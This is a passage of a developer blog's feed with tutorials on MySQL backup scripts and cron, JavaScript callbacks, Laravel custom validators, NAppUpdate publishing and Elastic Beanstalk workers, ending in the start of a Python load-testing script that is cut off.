    <content type="html"><![CDATA[<p>To backup your database from time to time, this can be done by write a simple shell script, and setup a cron job to run it</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">backup_dir=/path/to/backup/folder</span><br><span class="line">max_backup_files=5</span><br><span class="line">db_host=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">db_name=<span class="string">&quot;my_db&quot;</span></span><br><span class="line">db_user=<span class="string">&quot;root&quot;</span></span><br><span class="line">db_pass=<span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$backup_dir</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> <span class="variable">$backup_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">output_file=<span class="variable">$backup_dir</span>/`<span class="built_in">date</span> +<span class="string">&quot;%Y-%m-%d_%H-%M-%S.sql&quot;</span>`</span><br><span class="line"><span class="comment"># the tables data you want to exclude, but keep the structure</span></span><br><span class="line">excluded_tables=(</span><br><span class="line">ex_table1</span><br><span class="line">ex_table2</span><br><span class="line">ex_table3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ignored_tables_string_with_option=<span class="string">&#x27;&#x27;</span></span><br><span class="line">ignored_tables_string=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> tbl <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;excluded_tables[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span> :</span><br><span class="line">   ignored_tables_string_with_option+=<span class="string">&quot; --ignore-table=<span class="variable">$&#123;db_name&#125;</span>.<span class="variable">$&#123;tbl&#125;</span>&quot;</span></span><br><span class="line">   ignored_tables_string+=<span class="string">&quot; <span class="variable">$&#123;tbl&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change this line if you use postgresql</span></span><br><span class="line">mysqldump <span class="variable">$db_name</span> -u <span class="variable">$db_user</span> -h <span class="variable">$db_host</span> -p<span class="variable">$db_pass</span> <span class="variable">$&#123;ignored_tables_string_with_option&#125;</span> &gt; <span class="variable">$output_file</span></span><br><span class="line">mysqldump <span class="variable">$db_name</span> -u <span class="variable">$db_user</span> -h <span class="variable">$db_host</span> -p<span class="variable">$db_pass</span> <span class="variable">$&#123;ignored_tables_string&#125;</span> --no-data &gt;&gt; <span class="variable">$output_file</span></span><br><span class="line"></span><br><span class="line">total_sql=`<span class="built_in">ls</span> -l <span class="variable">$backup_dir</span>/*.sql | <span class="built_in">wc</span> -l`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$total_sql</span> -gt <span class="variable">$max_backup_files</span> ]; <span class="keyword">then</span></span><br><span class="line">    old_file=`<span class="built_in">ls</span> <span class="variable">$backup_dir</span>/*.sql | <span class="built_in">sort</span> | <span class="built_in">head</span> -n 1`</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Exceed <span class="variable">$max_backup_files</span> files, remove <span class="variable">$old_file</span>&quot;</span></span><br><span class="line">    <span class="built_in">rm</span> -f <span class="variable">$old_file</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>Setup cronjob</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>crontab -e</span><br></pre></td></tr></table></figure><p>add the following content, example to backup everyday 11pm</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">23</span> * * * /path/<span class="keyword">to</span>/script.sh &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;To backup your database from time to time, this can be done by write a simple shell script, and setup a cron job to run it&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="shell-script" scheme="http://jslim.net/tags/shell-script/"/>
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
    <category term="devops" scheme="http://jslim.net/tags/devops/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript class define a callback delegate method</title>
    <link href="http://jslim.net/blog/2017/03/02/JavaScript-class-define-a-callback-delegate-method/"/>
    <id>http://jslim.net/blog/2017/03/02/JavaScript-class-define-a-callback-delegate-method/</id>
    <published>2017-03-02T07:12:55.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I recently working on a JavaScript project, which required to write <em>class</em>.</p><p>Usually I just use 3rd party plugin for most of my project, e.g. <code>jQuery.ajax</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: ...,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data, textStatus, jqXHR</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>something like that, but when I try to create a <em>class</em> which has a method like <code>success</code> in <code>jQuery.ajax</code>, to let the user who use my library to be able to handle the callback. So here is what I found:</p><p><strong>FooBar.js</strong></p><p>Your defination goes here</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">FooBar</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        initializeEvents.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">FooBar</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">close</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// this will invoke the method that defined in the implementation script</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">close</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">initializeEvents</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">closeButton</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">closeButton</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="variable language_">this</span>.<span class="property">close</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>script.js</strong></p><p>Your implementation goes here</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foobar = <span class="keyword">new</span> <span class="title class_">FooBar</span>(&#123;</span><br><span class="line">    <span class="attr">close</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;you clicked on close button&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>If let say you want to pass extra params</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">close</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="string">&#x27;extra message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="attr">close</span>: <span class="keyword">function</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;you clicked on close button with &#x27;</span> + msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://scotch.io/tutorials/building-your-own-javascript-modal-plugin">Building Your Own JavaScript Modal Plugin</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I recently working on a JavaScript project, which required to write &lt;em&gt;class&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Usually I just use 3rd party plugin for most</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 5 custom validator</title>
    <link href="http://jslim.net/blog/2016/12/16/Laravel-5-custom-validator/"/>
    <id>http://jslim.net/blog/2016/12/16/Laravel-5-custom-validator/</id>
    <published>2016-12-16T07:17:44.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>As the official documentation doesn’t specify how exactly to create a custom<br>validation class.</p><h3 id="1-Create-custom-validator-class"><a href="#1-Create-custom-validator-class" class="headerlink" title="1. Create custom validator class"></a>1. Create custom validator class</h3><p>You can create in any where as you like. For my example, I will create in<br><strong>app/Libraries/CustomValidator.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Libraries</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomValidator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * custom_rule:$param1,$param2,...</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $attribute </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $parameters </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateYourCustomRule</span>(<span class="params"><span class="variable">$attribute</span>, <span class="variable">$value</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// validate</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Update-to-provider"><a href="#2-Update-to-provider" class="headerlink" title="2. Update to provider"></a>2. Update to provider</h3><p>Edit the file <strong>app/Providers/AppServiceProvider.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">\Validator</span>::<span class="title function_ invoke__">extend</span>(<span class="string">&#x27;custom_rule&#x27;</span>, <span class="string">&#x27;App\Libraries\CustomValidator@validateYourCustomRule&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Add-the-error-message-to-language-file"><a href="#3-Add-the-error-message-to-language-file" class="headerlink" title="3. Add the error message to language file"></a>3. Add the error message to language file</h3><p>Edit <strong>resources/lang/en/validation.php</strong> and add this</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;custom_rule&#x27;</span> =&gt; <span class="string">&#x27;The :attribute has custom error.&#x27;</span>,</span><br></pre></td></tr></table></figure><h2 id="Test-it"><a href="#Test-it" class="headerlink" title="Test it"></a>Test it</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$rules</span> = [</span><br><span class="line">    <span class="string">&#x27;attr&#x27;</span> =&gt; <span class="string">&#x27;custom_rule:param1,param2&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://laracasts.com/discuss/channels/general-discussion/custom-validation-function-in-laravel-5?page=1">Custom Validation Function in Laravel 5</a></li><li><a href="http://stackoverflow.com/questions/34873101/unresolvable-dependency-resolving-error-custom-validation-in-laravel-5-1/34873877#34873877">“Unresolvable dependency resolving” error custom validation in laravel 5.1</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;As the official documentation doesn’t specify how exactly to create a custom&lt;br&gt;validation class.&lt;/p&gt;
&lt;h3</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>Automate WinForm app publish to match NAppUpdate standard</title>
    <link href="http://jslim.net/blog/2016/11/04/Automate-WinForm-app-publish-to-match-NAppUpdate-standard/"/>
    <id>http://jslim.net/blog/2016/11/04/Automate-WinForm-app-publish-to-match-NAppUpdate-standard/</id>
    <published>2016-11-04T04:00:45.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>If you’re using <a href="https://github.com/synhershko/NAppUpdate">NAppUpdate</a> framework to publish your WinForm app, this post is for you.</p><p>Assume that you already setup NAppUpdate successfully. Now we want to simplify it to just 1 click publish, and the others clients can just update it</p><h2 id="Server-side"><a href="#Server-side" class="headerlink" title="Server side"></a>Server side</h2><p>In your server, you need a path to store the xml file. For my case, I will create a subdomain for it. E.g.</p><p><a href="pub.yoursite.com">pub.yoursite.com</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/var/</span>www/pub.yoursite.com</span><br></pre></td></tr></table></figure><p>Assume your site hosted in this path</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── releases</span><br><span class="line">├── <span class="keyword">index</span>.php</span><br><span class="line">└── <span class="keyword">release</span>.xml</span><br></pre></td></tr></table></figure><p>The <strong>index.php</strong> you can just simply put some dummy text into it, because the most important file is <strong>release.xml</strong></p><p>The content of <strong>release.xml</strong> is auto generated. I’ve created the <a href="/attachments/posts/2016-11-04-Automate-WinForm-app-publish-to-match-NAppUpdate-standard/publish.php">php file</a>, download it to your server, and place it anywhere, <em>(e.g. /path/to/publish.php)</em></p><p>Then create a cronjob for it</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * <span class="regexp">/usr/</span>bin<span class="regexp">/php /</span>path<span class="regexp">/to/</span>publish.php &gt; <span class="regexp">/dev/</span><span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>This cronjob will run every minute, so once you have new file published to server, it will auto generate the <strong>release.xml</strong></p><h2 id="WinForm-Visual-Studio"><a href="#WinForm-Visual-Studio" class="headerlink" title="WinForm (Visual Studio)"></a>WinForm <em>(Visual Studio)</em></h2><p>First you need to build the project</p><p><img src="/images/posts/2016-11-04-Automate-WinForm-app-publish-to-match-NAppUpdate-standard/build.png" alt="Build the project"></p><p>Then go to property there</p><p><img src="/images/posts/2016-11-04-Automate-WinForm-app-publish-to-match-NAppUpdate-standard/property.png" alt="Project property"></p><p>And the go to <strong>Publish</strong> tab</p><p><img src="/images/posts/2016-11-04-Automate-WinForm-app-publish-to-match-NAppUpdate-standard/publish.png" alt="Publish settings"></p><p>Set your FTP details, then publish it</p><h2 id="Server-side-1"><a href="#Server-side-1" class="headerlink" title="Server side"></a>Server side</h2><p>Edit the file <strong>/path/to/publish.php</strong>, change the constants to match your own</p><ul><li><strong>PUBLISH_INPUT_ROOT</strong>: <code>/home/ftpuser/path/to/releases/Application\ Files</code></li><li><strong>PUBLISH_OUTPUT_ROOT</strong>: <code>/var/www/pub.yoursite.com/releases</code></li><li><strong>PUBLISH_XML_FEED</strong>: <code>/var/www/pub.yoursite.com/release.xml</code></li><li><strong>WINFORM_PREFIX</strong>: <code>YourProject_</code></li><li><strong>BASE_URL</strong>: <code>http://pub.yoursite.com</code></li></ul><p>Now once your app published, the cronjob will execute this php script, and the script will generate <strong>release.xml</strong>,<br>and copy the necessary files to <strong>releases</strong> folder.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── releases</span><br><span class="line">│   ├── v1<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">│   └── v1<span class="number">.0</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">├── <span class="keyword">index</span>.php</span><br><span class="line">└── <span class="keyword">release</span>.xml</span><br></pre></td></tr></table></figure><p>Inside the <strong>releases</strong> folder will then have all version of what you have published.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If you’re using &lt;a href=&quot;https://github.com/synhershko/NAppUpdate&quot;&gt;NAppUpdate&lt;/a&gt; framework to publish your WinForm app, this post is</summary>
        
      
    
    
    
    
    <category term="c#" scheme="http://jslim.net/tags/c/"/>
    
    <category term="winform" scheme="http://jslim.net/tags/winform/"/>
    
    <category term="nappupdate" scheme="http://jslim.net/tags/nappupdate/"/>
    
  </entry>
  
  <entry>
    <title>Setup cronjob &amp;amp; queue in Elastic Beanstalk with Laravel</title>
    <link href="http://jslim.net/blog/2016/07/18/setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/"/>
    <id>http://jslim.net/blog/2016/07/18/setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/</id>
    <published>2016-07-18T18:39:16.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>This is basically part-2 continue from <a href="/blog/2016/05/24/setup-laravel-5-in-amazon-elastic-beanstalk/">Setup Laravel 5 in Amazon Elastic Beanstalk</a>.</p><p>In most cases, we need to run some long process tasks in background, by either cronjob or queue.</p><p>Here I’ll demostrate both.</p><h2 id="Create-a-worker-tier"><a href="#Create-a-worker-tier" class="headerlink" title="Create a worker tier"></a>Create a worker tier</h2><p>We need to separate normal http operation from long process background tasks. So let’s create a worker environment</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eb create <span class="tag">&lt;<span class="name">environment</span>&gt;</span> -t worker</span><br></pre></td></tr></table></figure><h2 id="Post-hook-after-eb-deploy"><a href="#Post-hook-after-eb-deploy" class="headerlink" title="Post hook after eb deploy"></a>Post hook after <code>eb deploy</code></h2><p>First, create a directory in your project root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /path/to/project</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> .ebextensions</span></span><br></pre></td></tr></table></figure><p>You can <a href="http://docs.aws.amazon.com/elasticbeanstalk/latest/dg/ebextensions.html">read the official documentation here</a></p><p><em>From now onward, I assume the <strong>current directory</strong> is in project root</em></p><h3 id="Setup-queue-with-supervisor-amp-sqs"><a href="#Setup-queue-with-supervisor-amp-sqs" class="headerlink" title="Setup queue with supervisor &amp; sqs"></a>Setup queue with supervisor &amp; sqs</h3><p>First you need to create a <strong>.config</strong> file</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">packages</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">yum</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">python27-setuptools</span><span class="punctuation">:</span> <span class="string">[]</span></span><br><span class="line"><span class="attribute">container_commands</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">01-supervise</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">command</span><span class="punctuation">:</span> <span class="string">&quot;.ebextensions/supervise.sh&quot;</span></span><br></pre></td></tr></table></figure><p>Where the supervise.sh you can <a href="/attachments/posts/2016-07-19-setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/supervise.sh">download here</a></p><p><em>(credit to <a href="http://www.lifeofguenter.de/2015/04/laravel-queues-with-supervisor-on.html">Günter Grodotzki</a>)</em></p><p>Once you done this, you must add an environment variable in your elastic beanstalk console <em>(worker tier only)</em> “SUPERVISE=enable” to activate</p><p><img src="/images/posts/2016-07-19-setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/eb-environment-variable-supervise.png" alt="AWS Elastic Beanstalk environment"></p><p>Because you don’t want the <strong>webapp</strong> environment to listen to the queue, thus this variable is used to identify which environment need to run this.</p><h4 id="Create-a-queue"><a href="#Create-a-queue" class="headerlink" title="Create a queue"></a>Create a queue</h4><p>Create a queue in SQS console, then copy the URL to environment variable, e.g.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>sqs.ap-southeast-<span class="number">1</span>.amazonaws.com<span class="regexp">/999999999999/</span>laravel-queue</span><br></pre></td></tr></table></figure><p>For how to use queue in laravel, <a href="https://laravel.com/docs/master/queues">refer here</a></p><h3 id="Setup-cronjob"><a href="#Setup-cronjob" class="headerlink" title="Setup cronjob"></a>Setup cronjob</h3><p>Create a file named <strong>cron.config</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">container_commands:</span></span><br><span class="line">  <span class="number">01</span>-crontab:</span><br><span class="line"><span class="symbol">    command:</span> <span class="string">&quot;.ebextensions/cron.sh&quot;</span></span><br></pre></td></tr></table></figure><p>Where the cron.sh you can <a href="/attachments/posts/2016-07-19-setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/cron.sh">download here</a><br>and also <a href="/attachments/posts/2016-07-19-setup-cronjob-and-queue-in-elastic-beanstalk-with-laravel/crontab">download the crontab</a> <em>(you may modify if you need)</em></p><p>Place this 2 files in <strong>.ebextensions</strong>. Again, same as supervise, you need to add <code>INS_CRONTAB</code> environment variable in worker tier, and set the value to <code>enable</code>.</p><p><strong>One thing to take note</strong>, whenever the environment scale up to multiple server, your crontab may run multiple times, thus, I suggest that<br>create a table <em>(e.g. <code>cronjob</code>)</em> in database, and add 2 attributes: <code>executed_at</code> and <code>completed_at</code>.</p><p>Thus, in your php script, you only run those job with <code>executed_at</code> = <code>null</code>, to avoid duplication.</p><h2 id="Deploy-your-app"><a href="#Deploy-your-app" class="headerlink" title="Deploy your app"></a>Deploy your app</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eb deploy <span class="tag">&lt;<span class="name">worker</span> <span class="attr">environment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Done</p><p>References:</p><ul><li><a href="http://www.lifeofguenter.de/2015/04/laravel-queues-with-supervisor-on.html">Laravel queues with supervisor on ElasticBeanstalk</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;This is basically part-2 continue from &lt;a href=&quot;/blog/2016/05/24/setup-laravel-5-in-amazon-elastic-beanstalk/&quot;&gt;Setup Laravel 5 in Amazon</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>Python script to simulate multiple concurrent requests to web application</title>
    <link href="http://jslim.net/blog/2016/06/29/python-script-to-simulate-multiple-concurrent-requests-to-web-application/"/>
    <id>http://jslim.net/blog/2016/06/29/python-script-to-simulate-multiple-concurrent-requests-to-web-application/</id>
    <published>2016-06-29T01:03:14.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I first created this script to heavy test the web application hosted in elastic beanstalk.</p><p>Why <strong>python</strong>? Just for fun :)</p><p>Let’s begin</p><p>First, define a main function for the python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span> datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># http requests goes here</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment"># every 1 second submit http requests</span></span><br><span class="line"></span><br><span 